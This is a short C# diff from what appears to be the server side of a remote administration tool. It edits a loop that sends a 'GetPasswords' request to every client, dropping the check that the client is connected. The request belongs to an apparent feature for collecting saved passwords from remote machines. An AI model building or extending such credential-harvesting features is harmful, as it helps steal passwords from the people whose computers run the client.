@@ -51,7 +51,7 @@ namespace xServer.Forms
             allToolStripMenuItem2_Click(null, null);
 
             var req = new Core.Packets.ServerPackets.GetPasswords();
-            foreach (var client in _clients.Where(client => client != null && client.Connected))
+            foreach (var client in _clients.Where(client => client != null))
                 req.Execute(client);
         }
 
